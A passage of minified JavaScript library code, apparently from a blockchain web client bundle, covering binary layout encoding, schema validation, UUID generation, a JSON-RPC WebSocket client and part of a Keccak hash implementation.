o=this.defaultGetSourceVariant.bind(this);this.getSourceVariant=function(t){return o(t)},this.configGetSourceVariant=function(t){o=t.bind(this)}}getSpan(t,e=0){if(0<=this.span)return this.span;let r=this.getVariant(t,e);if(!r)throw Error("unable to determine span for unrecognized variant");return r.getSpan(t,e)}defaultGetSourceVariant(t){if(Object.prototype.hasOwnProperty.call(t,this.discriminator.property)){if(this.defaultLayout&&this.defaultLayout.property&&Object.prototype.hasOwnProperty.call(t,this.defaultLayout.property))return;let e=this.registry[t[this.discriminator.property]];if(e&&(!e.layout||e.property&&Object.prototype.hasOwnProperty.call(t,e.property)))return e}else for(let e in this.registry){let r=this.registry[e];if(r.property&&Object.prototype.hasOwnProperty.call(t,r.property))return r}throw Error("unable to infer src variant")}decode(t,e=0){let r;let i=this.discriminator,n=i.decode(t,e),o=this.registry[n];if(void 0===o){let o=this.defaultLayout,s=0;this.usesPrefixDiscriminator&&(s=i.layout.span),(r=this.makeDestinationObject())[i.property]=n,r[o.property]=o.decode(t,e+s)}else r=o.decode(t,e);return r}encode(t,e,r=0){let i=this.getSourceVariant(t);if(void 0===i){let i=this.discriminator,n=this.defaultLayout,o=0;return this.usesPrefixDiscriminator&&(o=i.layout.span),i.encode(t[i.property],e,r),o+n.encode(t[n.property],e,r+o)}return i.encode(t,e,r)}addVariant(t,e,r){let i=new rn(this,t,e,r);return this.registry[t]=i,i}getVariant(t,e=0){let r;return t instanceof Uint8Array?r=this.discriminator.decode(t,e):r=t,this.registry[r]}}eW.Union=ri;class rn extends ej{constructor(t,e,r,i){if(!(t instanceof ri))throw TypeError("union must be a Union");if(!Number.isInteger(e)||0>e)throw TypeError("variant must be a (non-negative) integer");if("string"==typeof r&&void 0===i&&(i=r,r=null),r){if(!(r instanceof ej))throw TypeError("layout must be a Layout");if(null!==t.defaultLayout&&0<=r.span&&r.span>t.defaultLayout.span)throw Error("variant span exceeds span of containing union");if("string"!=typeof i)throw TypeError("variant must have a String property")}let n=t.span;0>t.span&&0<=(n=r?r.span:0)&&t.usesPrefixDiscriminator&&(n+=t.discriminator.layout.span),super(n,i),this.union=t,this.variant=e,this.layout=r||null}getSpan(t,e=0){if(0<=this.span)return this.span;let r=0;this.union.usesPrefixDiscriminator&&(r=this.union.discriminator.layout.span);let i=0;return this.layout&&(i=this.layout.getSpan(t,e+r)),r+i}decode(t,e=0){let r=this.makeDestinationObject();if(this!==this.union.getVariant(t,e))throw Error("variant mismatch");let i=0;return this.union.usesPrefixDiscriminator&&(i=this.union.discriminator.layout.span),this.layout?r[this.property]=this.layout.decode(t,e+i):this.property?r[this.property]=!0:this.union.usesPrefixDiscriminator&&(r[this.union.discriminator.property]=this.variant),r}encode(t,e,r=0){let i=0;if(this.union.usesPrefixDiscriminator&&(i=this.union.discriminator.layout.span),this.layout&&!Object.prototype.hasOwnProperty.call(t,this.property))throw TypeError("variant lacks property "+this.property);this.union.discriminator.encode(this.variant,e,r);let n=i;if(this.layout&&(this.layout.encode(t[this.property],e,r+i),n+=this.layout.getSpan(e,r+i),0<=this.union.span&&n>this.union.span))throw Error("encoded variant overruns containing union");return n}fromArray(t){if(this.layout)return this.layout.fromArray(t)}}function ro(t){return 0>t&&(t+=0x100000000),t}eW.VariantLayout=rn;class rs extends ej{constructor(t,e,r){if(!(t instanceof eG||t instanceof eJ))throw TypeError("word must be a UInt or UIntBE layout");if("string"==typeof e&&void 0===r&&(r=e,e=!1),4<t.span)throw RangeError("word cannot exceed 32 bits");super(t.span,r),this.word=t,this.msb=!!e,this.fields=[];let i=0;this._packedSetValue=function(t){return i=ro(t),this},this._packedGetValue=function(){return i}}decode(t,e=0){let r=this.makeDestinationObject(),i=this.word.decode(t,e);for(let e of(this._packedSetValue(i),this.fields))void 0!==e.property&&(r[e.property]=e.decode(t));return r}encode(t,e,r=0){let i=this.word.decode(e,r);for(let e of(this._packedSetValue(i),this.fields))if(void 0!==e.property){let r=t[e.property];void 0!==r&&e.encode(r)}return this.word.encode(this._packedGetValue(),e,r)}addField(t,e){let r=new ra(this,t,e);return this.fields.push(r),r}addBoolean(t){let e=new ru(this,t);return this.fields.push(e),e}fieldFor(t){if("string"!=typeof t)throw TypeError("property must be string");for(let e of this.fields)if(e.property===t)return e}}eW.BitStructure=rs;class ra{constructor(t,e,r){if(!(t instanceof rs))throw TypeError("container must be a BitStructure");if(!Number.isInteger(e)||0>=e)throw TypeError("bits must be positive integer");let i=8*t.span,n=t.fields.reduce((t,e)=>t+e.bits,0);if(e+n>i)throw Error("bits too long for span remainder ("+(i-n)+" of "+i+" remain)");this.container=t,this.bits=e,this.valueMask=(1<<e)-1,32===e&&(this.valueMask=0xffffffff),this.start=n,this.container.msb&&(this.start=i-n-e),this.wordMask=ro(this.valueMask<<this.start),this.property=r}decode(t,e){return ro(this.container._packedGetValue()&this.wordMask)>>>this.start}encode(t){if("number"!=typeof t||!Number.isInteger(t)||t!==ro(t&this.valueMask))throw TypeError(eK("BitField.encode",this)+" value must be integer not exceeding "+this.valueMask);let e=this.container._packedGetValue(),r=ro(t<<this.start);this.container._packedSetValue(ro(e&~this.wordMask)|r)}}eW.BitField=ra;class ru extends ra{constructor(t,e){super(t,1,e)}decode(t,e){return!!super.decode(t,e)}encode(t){"boolean"==typeof t&&(t=+t),super.encode(t)}}eW.Boolean=ru;class rl extends ej{constructor(t,e){if(!(t instanceof eV&&t.isCount()||Number.isInteger(t)&&0<=t))throw TypeError("length must be positive integer or an unsigned integer ExternalLayout");let r=-1;t instanceof eV||(r=t),super(r,e),this.length=t}getSpan(t,e){let r=this.span;return 0>r&&(r=this.length.decode(t,e)),r}decode(t,e=0){let r=this.span;return 0>r&&(r=this.length.decode(t,e)),eD(t).slice(e,e+r)}encode(t,e,r){let i=this.length;if(this.length instanceof eV&&(i=t.length),!(t instanceof Uint8Array&&i===t.length))throw TypeError(eK("Blob.encode",this)+" requires (length "+i+") Uint8Array as src");if(r+i>e.length)throw RangeError("encoding overruns Uint8Array");let n=eD(t);return eD(e).write(n.toString("hex"),r,i,"hex"),this.length instanceof eV&&this.length.encode(i,e,r),i}}eW.Blob=rl;class rc extends ej{constructor(t){super(-1,t)}getSpan(t,e=0){eF(t);let r=e;for(;r<t.length&&0!==t[r];)r+=1;return 1+r-e}decode(t,e=0){let r=this.getSpan(t,e);return eD(t).slice(e,e+r-1).toString("utf-8")}encode(t,e,r=0){"string"!=typeof t&&(t=String(t));let i=f.Buffer.from(t,"utf8"),n=i.length;if(r+n>e.length)throw RangeError("encoding overruns Buffer");let o=eD(e);return i.copy(o,r),o[r+n]=0,n+1}}eW.CString=rc;class rh extends ej{constructor(t,e){if("string"==typeof t&&void 0===e&&(e=t,t=void 0),void 0===t)t=-1;else if(!Number.isInteger(t))throw TypeError("maxSpan must be an integer");super(-1,e),this.maxSpan=t}getSpan(t,e=0){return eF(t),t.length-e}decode(t,e=0){let r=this.getSpan(t,e);if(0<=this.maxSpan&&this.maxSpan<r)throw RangeError("text length exceeds maxSpan");return eD(t).slice(e,e+r).toString("utf-8")}encode(t,e,r=0){"string"!=typeof t&&(t=String(t));let i=f.Buffer.from(t,"utf8"),n=i.length;if(0<=this.maxSpan&&this.maxSpan<n)throw RangeError("text length exceeds maxSpan");if(r+n>e.length)throw RangeError("encoding overruns Buffer");return i.copy(eD(e),r),n}}eW.UTF8=rh;class rf extends ej{constructor(t,e){super(0,e),this.value=t}decode(t,e){return this.value}encode(t,e,r){return 0}}eW.Constant=rf,eW.greedy=(t,e)=>new e$(t,e),eW.offset=(t,e,r)=>new eZ(t,e,r),eW.u8=t=>new eG(1,t),eW.u16=t=>new eG(2,t),eW.u24=t=>new eG(3,t),eW.u32=t=>new eG(4,t),eW.u40=t=>new eG(5,t),eW.u48=t=>new eG(6,t),eW.nu64=t=>new e1(t),eW.u16be=t=>new eJ(2,t),eW.u24be=t=>new eJ(3,t),eW.u32be=t=>new eJ(4,t),eW.u40be=t=>new eJ(5,t),eW.u48be=t=>new eJ(6,t),eW.nu64be=t=>new e2(t),eW.s8=t=>new eY(1,t),eW.s16=t=>new eY(2,t),eW.s24=t=>new eY(3,t),eW.s32=t=>new eY(4,t),eW.s40=t=>new eY(5,t),eW.s48=t=>new eY(6,t),eW.ns64=t=>new e3(t),eW.s16be=t=>new eX(2,t),eW.s24be=t=>new eX(3,t),eW.s32be=t=>new eX(4,t),eW.s40be=t=>new eX(5,t),eW.s48be=t=>new eX(6,t),eW.ns64be=t=>new e8(t),eW.f32=t=>new e6(t),eW.f32be=t=>new e5(t),eW.f64=t=>new e4(t),eW.f64be=t=>new e9(t),eW.struct=(t,e,r)=>new rt(t,e,r),eW.bits=(t,e,r)=>new rs(t,e,r),eW.seq=(t,e,r)=>new e7(t,e,r),eW.union=(t,e,r)=>new ri(t,e,r),eW.unionLayoutDiscriminator=(t,e)=>new rr(t,e),eW.blob=(t,e)=>new rl(t,e),eW.cstr=t=>new rc(t),eW.utf8=(t,e)=>new rh(t,e),eW.constant=(t,e)=>new rf(t,e);var rd={},f=c("6ZWSX"),rp=f.Buffer;Object.defineProperty(rd,"__esModule",{value:!0}),rd.toBigIntLE=function(t){{let e=rp.from(t);e.reverse();let r=e.toString("hex");return 0===r.length?BigInt(0):BigInt(`0x${r}`)}},rd.toBigIntBE=function(t){{let e=t.toString("hex");return 0===e.length?BigInt(0):BigInt(`0x${e}`)}},rd.toBufferLE=function(t,e){{let r=t.toString(16),i=rp.from(r.padStart(2*e,"0").slice(0,2*e),"hex");return i.reverse(),i}},rd.toBufferBE=function(t,e){{let r=t.toString(16);return rp.from(r.padStart(2*e,"0").slice(0,2*e),"hex")}};class rg extends TypeError{constructor(t,e){let r;let{message:i,explanation:n,...o}=t,{path:s}=t,a=0===s.length?i:`At path: ${s.join(".")} -- ${i}`;super(n??a),null!=n&&(this.cause=a),Object.assign(this,o),this.name=this.constructor.name,this.failures=()=>r??(r=[t,...e()])}}function rm(t){return"object"==typeof t&&null!=t}function ry(t){return rm(t)&&!Array.isArray(t)}function rb(t){return"symbol"==typeof t?t.toString():"string"==typeof t?JSON.stringify(t):`${t}`}function*rw(t,e,r,i){var n;for(let o of(rm(n=t)&&"function"==typeof n[Symbol.iterator]||(t=[t]),t)){let t=function(t,e,r,i){if(!0===t)return;!1===t?t={}:"string"==typeof t&&(t={message:t});let{path:n,branch:o}=e,{type:s}=r,{refinement:a,message:u=`Expected a value of type \`${s}\`${a?` with refinement \`${a}\``:""}, but received: \`${rb(i)}\``}=t;return{value:i,type:s,refinement:a,key:n[n.length-1],path:n,branch:o,...t,message:u}}(o,e,r,i);t&&(yield t)}}function*rv(t,e,r={}){let{path:i=[],branch:n=[t],coerce:o=!1,mask:s=!1}=r,a={path:i,branch:n,mask:s};o&&(t=e.coercer(t,a));let u="valid";for(let i of e.validator(t,a))i.explanation=r.message,u="not_valid",yield[i,void 0];for(let[l,c,h]of e.entries(t,a))for(let e of rv(c,h,{path:void 0===l?i:[...i,l],branch:void 0===l?n:[...n,c],coerce:o,mask:s,message:r.message}))e[0]?(u=null!=e[0].refinement?"not_refined":"not_valid",yield[e[0],void 0]):o&&(c=e[1],void 0===l?t=c:t instanceof Map?t.set(l,c):t instanceof Set?t.add(c):rm(t)&&(void 0!==c||l in t)&&(t[l]=c));if("not_valid"!==u)for(let i of e.refiner(t,a))i.explanation=r.message,u="not_refined",yield[i,void 0];"valid"===u&&(yield[void 0,t])}class rx{constructor(t){let{type:e,schema:r,validator:i,refiner:n,coercer:o=t=>t,entries:s=function*(){}}=t;this.type=e,this.schema=r,this.entries=s,this.coercer=o,i?this.validator=(t,e)=>rw(i(t,e),e,this,t):this.validator=()=>[],n?this.refiner=(t,e)=>rw(n(t,e),e,this,t):this.refiner=()=>[]}assert(t,e){return function(t,e,r){let i=rS(t,e,{message:r});if(i[0])throw i[0]}(t,this,e)}create(t,e){return rk(t,this,e)}is(t){return!rS(t,this)[0]}mask(t,e){return function(t,e,r){let i=rS(t,e,{coerce:!0,mask:!0,message:r});if(!i[0])return i[1];throw i[0]}(t,this,e)}validate(t,e={}){return rS(t,this,e)}}function rk(t,e,r){let i=rS(t,e,{coerce:!0,message:r});if(!i[0])return i[1];throw i[0]}function rS(t,e,r={}){let i=rv(t,e,r),n=function(t){let{done:e,value:r}=t.next();return e?void 0:r}(i);return n[0]?[new rg(n[0],function*(){for(let t of i)t[0]&&(yield t[0])}),void 0]:[void 0,n[1]]}function rB(t,e){return new rx({type:t,schema:null,validator:e})}function rE(t){return new rx({type:"array",schema:t,*entries(e){if(t&&Array.isArray(e))for(let[r,i]of e.entries())yield[r,i,t]},coercer:t=>Array.isArray(t)?t.slice():t,validator:t=>Array.isArray(t)||`Expected an array value, but received: ${rb(t)}`})}function rA(){return rB("boolean",t=>"boolean"==typeof t)}function r_(t){return rB("instance",e=>e instanceof t||`Expected a \`${t.name}\` instance, but received: ${rb(e)}`)}function rI(t){let e=rb(t),r=typeof t;return new rx({type:"literal",schema:"string"===r||"number"===r||"boolean"===r?t:null,validator:r=>r===t||`Expected the literal \`${e}\`, but received: ${rb(r)}`})}function rM(t){return new rx({...t,validator:(e,r)=>null===e||t.validator(e,r),refiner:(e,r)=>null===e||t.refiner(e,r)})}function rL(){return rB("number",t=>"number"==typeof t&&!isNaN(t)||`Expected a number, but received: ${rb(t)}`)}function rT(t){return new rx({...t,validator:(e,r)=>void 0===e||t.validator(e,r),refiner:(e,r)=>void 0===e||t.refiner(e,r)})}function rO(t,e){return new rx({type:"record",schema:null,*entries(r){if(rm(r))for(let i in r){let n=r[i];yield[i,i,t],yield[i,n,e]}},validator:t=>ry(t)||`Expected an object, but received: ${rb(t)}`,coercer:t=>ry(t)?{...t}:t})}function rP(){return rB("string",t=>"string"==typeof t||`Expected a string, but received: ${rb(t)}`)}function rR(t){let e=rB("never",()=>!1);return new rx({type:"tuple",schema:null,*entries(r){if(Array.isArray(r)){let i=Math.max(t.length,r.length);for(let n=0;n<i;n++)yield[n,r[n],t[n]||e]}},validator:t=>Array.isArray(t)||`Expected an array, but received: ${rb(t)}`,coercer:t=>Array.isArray(t)?t.slice():t})}function rC(t){let e=Object.keys(t);return new rx({type:"type",schema:t,*entries(r){if(rm(r))for(let i of e)yield[i,r[i],t[i]]},validator:t=>ry(t)||`Expected an object, but received: ${rb(t)}`,coercer:t=>ry(t)?{...t}:t})}function rU(t){let e=t.map(t=>t.type).join(" | ");return new rx({type:"union",schema:null,coercer(e,r){for(let i of t){let[t,n]=i.validate(e,{coerce:!0,mask:r.mask});if(!t)return n}return e},validator(r,i){let n=[];for(let e of t){let[...t]=rv(r,e,i),[o]=t;if(!o[0])return[];for(let[e]of t)e&&n.push(e)}return[`Expected the value to satisfy a union of \`${e}\`, but received: ${rb(r)}`,...n]}})}function rN(){return rB("unknown",()=>!0)}function rz(t,e,r){return new rx({...t,coercer:(i,n)=>rS(i,e)[0]?t.coercer(i,n):t.coercer(r(i,n),n)})}for(var rH={},rq=new Uint8Array(16),rW=/^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i,rF=[],rD=0;rD<256;++rD)rF.push((rD+256).toString(16).substr(1));var rj=function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0,r=(rF[t[e+0]]+rF[t[e+1]]+rF[t[e+2]]+rF[t[e+3]]+"-"+rF[t[e+4]]+rF[t[e+5]]+"-"+rF[t[e+6]]+rF[t[e+7]]+"-"+rF[t[e+8]]+rF[t[e+9]]+"-"+rF[t[e+10]]+rF[t[e+11]]+rF[t[e+12]]+rF[t[e+13]]+rF[t[e+14]]+rF[t[e+15]]).toLowerCase();if(!("string"==typeof r&&rW.test(r)))throw TypeError("Stringified UUID is invalid");return r},rK=function(t,e,r){var i=(t=t||{}).random||(t.rng||function(){if(!n&&!(n="undefined"!=typeof crypto&&crypto.getRandomValues&&crypto.getRandomValues.bind(crypto)||"undefined"!=typeof msCrypto&&"function"==typeof msCrypto.getRandomValues&&msCrypto.getRandomValues.bind(msCrypto)))throw Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");return n(rq)})();if(i[6]=15&i[6]|64,i[8]=63&i[8]|128,e){r=r||0;for(var o=0;o<16;++o)e[r+o]=i[o];return e}return rj(i)},rV={};rV=function(t,e,r,i){if("string"!=typeof t)throw TypeError(t+" must be a string");let n="number"==typeof(i=i||{}).version?i.version:2;if(1!==n&&2!==n)throw TypeError(n+" must be 1 or 2");let o={method:t};if(2===n&&(o.jsonrpc="2.0"),e){if("object"!=typeof e&&!Array.isArray(e))throw TypeError(e+" must be an object, array or omitted");o.params=e}if(void 0===r){let t="function"==typeof i.generator?i.generator:function(){return rK()};o.id=t(o,i)}else 2===n&&null===r?i.notificationIdNull&&(o.id=null):o.id=r;return o};const r$=function(t,e){if(!(this instanceof r$))return new r$(t,e);e||(e={}),this.options={reviver:void 0!==e.reviver?e.reviver:null,replacer:void 0!==e.replacer?e.replacer:null,generator:void 0!==e.generator?e.generator:function(){return rK()},version:void 0!==e.version?e.version:2,notificationIdNull:"boolean"==typeof e.notificationIdNull&&e.notificationIdNull},this.callServer=t};rH=r$,r$.prototype.request=function(t,e,r,i){let n;let o=this,s=null,a=Array.isArray(t)&&"function"==typeof e;if(1===this.options.version&&a)throw TypeError("JSON-RPC 1.0 does not support batching");let u=!a&&t&&"object"==typeof t&&"function"==typeof e;if(a||u)i=e,s=t;else{"function"==typeof r&&(i=r,r=void 0);let n="function"==typeof i;try{s=rV(t,e,r,{generator:this.options.generator,version:this.options.version,notificationIdNull:this.options.notificationIdNull})}catch(t){if(n)return i(t);throw t}if(!n)return s}try{n=JSON.stringify(s,this.options.replacer)}catch(t){return i(t)}return this.callServer(n,function(t,e){o._parseResponse(t,e,i)}),s},r$.prototype._parseResponse=function(t,e,r){let i;if(t){r(t);return}if(!e)return r();try{i=JSON.parse(e,this.options.reviver)}catch(t){return r(t)}if(3===r.length){if(!Array.isArray(i))return r(null,i.error,i.result);{let t=function(t){return void 0!==t.error};return r(null,i.filter(t),i.filter(function(e){return!t(e)}))}}r(null,i)};var f=c("6ZWSX"),rZ={},rG=Object.prototype.hasOwnProperty,rJ="~";function rY(){}function rX(t,e,r){this.fn=t,this.context=e,this.once=r||!1}function rQ(t,e,r,i,n){if("function"!=typeof r)throw TypeError("The listener must be a function");var o=new rX(r,i||t,n),s=rJ?rJ+e:e;return t._events[s]?t._events[s].fn?t._events[s]=[t._events[s],o]:t._events[s].push(o):(t._events[s]=o,t._eventsCount++),t}function r0(t,e){0==--t._eventsCount?t._events=new rY:delete t._events[e]}function r1(){this._events=new rY,this._eventsCount=0}Object.create&&(rY.prototype=Object.create(null),new rY().__proto__||(rJ=!1)),r1.prototype.eventNames=function(){var t,e,r=[];if(0===this._eventsCount)return r;for(e in t=this._events)rG.call(t,e)&&r.push(rJ?e.slice(1):e);return Object.getOwnPropertySymbols?r.concat(Object.getOwnPropertySymbols(t)):r},r1.prototype.listeners=function(t){var e=rJ?rJ+t:t,r=this._events[e];if(!r)return[];if(r.fn)return[r.fn];for(var i=0,n=r.length,o=Array(n);i<n;i++)o[i]=r[i].fn;return o},r1.prototype.listenerCount=function(t){var e=rJ?rJ+t:t,r=this._events[e];return r?r.fn?1:r.length:0},r1.prototype.emit=function(t,e,r,i,n,o){var s=rJ?rJ+t:t;if(!this._events[s])return!1;var a,u,l=this._events[s],c=arguments.length;if(l.fn){switch(l.once&&this.removeListener(t,l.fn,void 0,!0),c){case 1:return l.fn.call(l.context),!0;case 2:return l.fn.call(l.context,e),!0;case 3:return l.fn.call(l.context,e,r),!0;case 4:return l.fn.call(l.context,e,r,i),!0;case 5:return l.fn.call(l.context,e,r,i,n),!0;case 6:return l.fn.call(l.context,e,r,i,n,o),!0}for(u=1,a=Array(c-1);u<c;u++)a[u-1]=arguments[u];l.fn.apply(l.context,a)}else{var h,f=l.length;for(u=0;u<f;u++)switch(l[u].once&&this.removeListener(t,l[u].fn,void 0,!0),c){case 1:l[u].fn.call(l[u].context);break;case 2:l[u].fn.call(l[u].context,e);break;case 3:l[u].fn.call(l[u].context,e,r);break;case 4:l[u].fn.call(l[u].context,e,r,i);break;default:if(!a)for(h=1,a=Array(c-1);h<c;h++)a[h-1]=arguments[h];l[u].fn.apply(l[u].context,a)}}return!0},r1.prototype.on=function(t,e,r){return rQ(this,t,e,r,!1)},r1.prototype.once=function(t,e,r){return rQ(this,t,e,r,!0)},r1.prototype.removeListener=function(t,e,r,i){var n=rJ?rJ+t:t;if(!this._events[n])return this;if(!e)return r0(this,n),this;var o=this._events[n];if(o.fn)o.fn!==e||i&&!o.once||r&&o.context!==r||r0(this,n);else{for(var s=0,a=[],u=o.length;s<u;s++)(o[s].fn!==e||i&&!o[s].once||r&&o[s].context!==r)&&a.push(o[s]);a.length?this._events[n]=1===a.length?a[0]:a:r0(this,n)}return this},r1.prototype.removeAllListeners=function(t){var e;return t?(e=rJ?rJ+t:t,this._events[e]&&r0(this,e)):(this._events=new rY,this._eventsCount=0),this},r1.prototype.off=r1.prototype.removeListener,r1.prototype.addListener=r1.prototype.on,r1.prefixed=rJ,r1.EventEmitter=r1,rZ=r1;var r2=class extends rZ.EventEmitter{socket;constructor(t,e,r){super(),this.socket=new window.WebSocket(t,r),this.socket.onopen=()=>this.emit("open"),this.socket.onmessage=t=>this.emit("message",t.data),this.socket.onerror=t=>this.emit("error",t),this.socket.onclose=t=>{this.emit("close",t.code,t.reason)}}send(t,e,r){let i=r||e;try{this.socket.send(t),i()}catch(t){i(t)}}close(t,e){this.socket.close(t,e)}addEventListener(t,e,r){this.socket.addEventListener(t,e,r)}},r3=class{encode(t){return JSON.stringify(t)}decode(t){return JSON.parse(t)}},r8=class extends rZ.EventEmitter{address;rpc_id;queue;options;autoconnect;ready;reconnect;reconnect_timer_id;reconnect_interval;max_reconnects;rest_options;current_reconnects;generate_request_id;socket;webSocketFactory;dataPack;constructor(t,e="ws://localhost:8080",{autoconnect:r=!0,reconnect:i=!0,reconnect_interval:n=1e3,max_reconnects:o=5,...s}={},a,u){super(),this.webSocketFactory=t,this.queue={},this.rpc_id=0,this.address=e,this.autoconnect=r,this.ready=!1,this.reconnect=i,this.reconnect_timer_id=void 0,this.reconnect_interval=n,this.max_reconnects=o,this.rest_options=s,this.current_reconnects=0,this.generate_request_id=a||(()=>++this.rpc_id),u?this.dataPack=u:this.dataPack=new r3,this.autoconnect&&this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}connect(){this.socket||this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}call(t,e,r,i){return i||"object"!=typeof r||(i=r,r=null),new Promise((n,o)=>{if(!this.ready)return o(Error("socket not ready"));let s=this.generate_request_id(t,e);this.socket.send(this.dataPack.encode({jsonrpc:"2.0",method:t,params:e||void 0,id:s}),i,t=>{if(t)return o(t);this.queue[s]={promise:[n,o]},r&&(this.queue[s].timeout=setTimeout(()=>{delete this.queue[s],o(Error("reply timeout"))},r))})})}async login(t){let e=await this.call("rpc.login",t);if(!e)throw Error("authentication failed");return e}async listMethods(){return await this.call("__listMethods")}notify(t,e){return new Promise((r,i)=>{if(!this.ready)return i(Error("socket not ready"));this.socket.send(this.dataPack.encode({jsonrpc:"2.0",method:t,params:e}),t=>{if(t)return i(t);r()})})}async subscribe(t){"string"==typeof t&&(t=[t]);let e=await this.call("rpc.on",t);if("string"==typeof t&&"ok"!==e[t])throw Error("Failed subscribing to an event '"+t+"' with: "+e[t]);return e}async unsubscribe(t){"string"==typeof t&&(t=[t]);let e=await this.call("rpc.off",t);if("string"==typeof t&&"ok"!==e[t])throw Error("Failed unsubscribing from an event with: "+e);return e}close(t,e){this.socket.close(t||1e3,e)}setAutoReconnect(t){this.reconnect=t}setReconnectInterval(t){this.reconnect_interval=t}setMaxReconnects(t){this.max_reconnects=t}_connect(t,e){clearTimeout(this.reconnect_timer_id),this.socket=this.webSocketFactory(t,e),this.socket.addEventListener("open",()=>{this.ready=!0,this.emit("open"),this.current_reconnects=0}),this.socket.addEventListener("message",({data:t})=>{t instanceof ArrayBuffer&&(t=(0,f.Buffer).from(t).toString());try{t=this.dataPack.decode(t)}catch(t){return}if(t.notification&&this.listeners(t.notification).length){if(!Object.keys(t.params).length)return this.emit(t.notification);let e=[t.notification];if(t.params.constructor===Object)e.push(t.params);else for(let r=0;r<t.params.length;r++)e.push(t.params[r]);return Promise.resolve().then(()=>{this.emit.apply(this,e)})}if(!this.queue[t.id])return t.method?Promise.resolve().then(()=>{this.emit(t.method,t?.params)}):void 0;"error"in t=="result"in t&&this.queue[t.id].promise[1](Error('Server response malformed. Response must include either "result" or "error", but not both.')),this.queue[t.id].timeout&&clearTimeout(this.queue[t.id].timeout),t.error?this.queue[t.id].promise[1](t.error):this.queue[t.id].promise[0](t.result),delete this.queue[t.id]}),this.socket.addEventListener("error",t=>this.emit("error",t)),this.socket.addEventListener("close",({code:r,reason:i})=>{this.ready&&setTimeout(()=>this.emit("close",r,i),0),this.ready=!1,this.socket=void 0,1e3!==r&&(this.current_reconnects++,this.reconnect&&(this.max_reconnects>this.current_reconnects||0===this.max_reconnects)&&(this.reconnect_timer_id=setTimeout(()=>this._connect(t,e),this.reconnect_interval)))})}},r6={};Object.defineProperty(r6,"__esModule",{value:!0}),r6.shake256=r6.shake128=r6.keccak_512=r6.keccak_384=r6.keccak_256=r6.keccak_224=r6.sha3_512=r6.sha3_384=r6.sha3_256=r6.sha3_224=r6.Keccak=void 0,r6.keccakP=iU;var r5={};Object.defineProperty(r5,"__esModule",{value:!0}),r5.add5L=r5.add5H=r5.add4H=r5.add4L=r5.add3H=r5.add3L=r5.rotlBL=r5.rotlBH=r5.rotlSL=r5.rotlSH=r5.rotr32L=r5.rotr32H=r5.rotrBL=r5.rotrBH=r5.rotrSL=r5.rotrSH=r5.shrSL=r5.shrSH=r5.toBig=void 0,r5.fromBig=r7,r5.split=it,r5.add=im;const r4=BigInt(0x100000000-1),r9=BigInt(32);function r7(t,e=!1){return e?{h:Number(t&r4),l:Number(t>>r9&r4)}:{h:0|Number(t>>r9&r4),l:0|Number(t&r4)}}function it(t,e=!1){let r=new Uint32Array(t.length),i=new Uint32Array(t.length);for(let n=0;n<t.length;n++){let{h:o,l:s}=r7(t[n],e);[r[n],i[n]]=[o,s]}return[r,i]}const ie=(t,e)=>BigInt(t>>>0)<<r9|BigInt(e>>>0);r5.toBig=ie;const ir=(t,e,r)=>t>>>r;r5.shrSH=ir;const ii=(t,e,r)=>t<<32-r|e>>>r;r5.shrSL=ii;const io=(t,e,r)=>t>>>r|e<<32-r;r5.rotrSH=io;const is=(t,e,r)=>t<<32-r|e>>>r;r5.rotrSL=is;const ia=(t,e,r)=>t<<64-r|e>>>r-32;r5.rotrBH=ia;const iu=(t,e,r)=>t>>>r-32|e<<64-r;r5.rotrBL=iu;const il=(t,e)=>e;r5.rotr32H=il;const ic=(t,e)=>t;r5.rotr32L=ic;const ih=(t,e,r)=>t<<r|e>>>32-r;r5.rotlSH=ih;const id=(t,e,r)=>e<<r|t>>>32-r;r5.rotlSL=id;const ip=(t,e,r)=>e<<r-32|t>>>64-r;r5.rotlBH=ip;const ig=(t,e,r)=>t<<r-32|e>>>64-r;function im(t,e,r,i){let n=(e>>>0)+(i>>>0);return{h:t+r+(n/0x100000000|0)|0,l:0|n}}r5.rotlBL=ig;const iy=(t,e,r)=>(t>>>0)+(e>>>0)+(r>>>0);r5.add3L=iy;const ib=(t,e,r,i)=>e+r+i+(t/0x100000000|0)|0;r5.add3H=ib;const iw=(t,e,r,i)=>(t>>>0)+(e>>>0)+(r>>>0)+(i>>>0);r5.add4L=iw;const iv=(t,e,r,i,n)=>e+r+i+n+(t/0x100000000|0)|0;r5.add4H=iv;const ix=(t,e,r,i,n)=>(t>>>0)+(e>>>0)+(r>>>0)+(i>>>0)+(n>>>0);r5.add5L=ix;const ik=(t,e,r,i,n,o)=>e+r+i+n+o+(t/0x100000000|0)|0;r5.add5H=ik,r5.default={fromBig:r7,split:it,toBig:ie,shrSH:ir,shrSL:ii,rotrSH:io,rotrSL:is,rotrBH:ia,rotrBL:iu,rotr32H:il,rotr32L:ic,rotlSH:ih,rotlSL:id,rotlBH:ip,rotlBL:ig,add:im,add3L:iy,add3H:ib,add4L:iw,add4H:iv,add5H:ik,add5L:ix};const iS=[],iB=[],iE=[],iA=BigInt(0),i_=BigInt(1),iI=BigInt(2),iM=BigInt(7),iL=BigInt(256),iT=BigInt(113);for(let t=0,e=i_,r=1,i=0;t<24;t++){[r,i]=[i,(2*r+3*i)%5],iS.push(2*(5*i+r)),iB.push((t+1)*(t+2)/2%64);let n=iA;for(let t=0;t<7;t++)(e=(e<<i_^(e>>iM)*iT)%iL)&iI&&(n^=i_<<(i_<<BigInt(t))-i_);iE.push(n)}const[iO,iP]=(0,r5.split)(iE,!0),iR=(t,e,r)=>r>32?(0,r5.rotlBH)(t,e,r):(0,r5.rotlSH)(t,e,r),iC=(t,e,r)=>r>32?(0,r5.rotlBL)(t,e,r):(0,r5.rotlSL)(t,e,r);function iU(t,e=24){let r=new Uint32Array(10);for(let i=24-e;i<24;i++){for(let e=0;e<10;e++)r[e]=t[e]^t[e+10]^t[e+20]^t[e+30]^t[e+40];for(let e=0;e<10;e+=2){let i=(e+8)%10,n=(e+2)%10,o=r[n],s=r[n+1],a=iR(o,s,1)^r[i],u=iC(o,s,1)^r[i+1];for(let 